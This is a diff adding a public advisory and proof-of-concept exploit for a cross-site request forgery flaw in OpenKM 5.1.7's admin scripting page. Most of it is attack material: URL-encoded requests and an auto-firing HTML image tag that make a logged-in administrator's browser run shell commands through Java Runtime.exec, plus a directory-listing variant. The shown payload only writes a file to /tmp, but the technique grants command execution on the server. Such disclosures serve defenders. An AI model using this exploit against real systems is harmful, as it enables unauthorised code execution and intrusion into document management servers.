@@ -1,0 +1,42 @@
+source: http://www.securityfocus.com/bid/53602/info
+
+OpenKM is prone to a cross-site request-forgery vulnerability.
+
+Attackers can exploit this issue to perform certain administrative actions and gain unauthorized access to the affected application.
+
+OpenKM 5.1.7 is vulnerable; other versions may also be affected. 
+
+Login as administrator (having the AdminRole) and call the URL in a
+different
+browser window
+http://www.example.com/OpenKM/admin/scripting.jsp?script=String%5B%5D+cmd+%3
+D+%7B%22%2Fbin%2Fsh%22%2C+%22-c%22%2C+%22%2Fbin%2Fecho+pwned+%3E+%2Ftmp%
+2Fpoc%22%7D%3B%0D%0ARuntime.getRuntime%28%29.exec%28cmd%29%3B
+ 
+Alternatively the administrator could browse a prepared HTML page in a
+new tab
+<html>
+<body>
+<script>
+img = new Image();
+img.src="http://www.example.com/OpenKM/admin/scripting.jsp?script=String%5B%
+5D+cmd+%3D+%7B%22%2Fbin%2Fsh%22%2C+%22-c%22%2C+%22%2Fbin%2Fecho+pwned+%3
+E+%2Ftmp%2Fpoc%22%7D%3B%0D%0ARuntime.getRuntime%28%29.exec%28cmd%29%3B"
+</script>
+</body>
+</html>
+ 
+The above exploit does nothing else than just creating a file in /tmp
+ 
+String[] cmd = {"/bin/sh", "-c", "/bin/echo pwned > /tmp/poc"};
+Runtime.getRuntime().exec(cmd);
+ 
+Some might also want to browse directories
+http://www.example.com/OpenKM/admin/scripting.jsp?script=import+java.io.*%3B
+%0D%0A%0D%0Atry+%7B%0D%0A++++String+ls_str%3B%0D%0A++++Process+ls_proc+%
+3D+Runtime.getRuntime%28%29.exec%28%22%2Fbin%2Fls+-lah%22%29%3B%0D%0A+++
++DataInputStream+ls_in+%3D+new+DataInputStream%28ls_proc.getInputStream%
+28%29%29%3B%0D%0A%0D%0A++++while+%28%28ls_str+%3D+ls_in.readLine%28%29%2
+9+%21%3D+null%29+++++++++++%0D%0A++++++++print%28ls_str+%2B+%22%3Cbr%3E%
+22%29%3B%0D%0A%0D%0A%7D+catch+%28IOException+e%29+%7B%0D%0A%7D
+
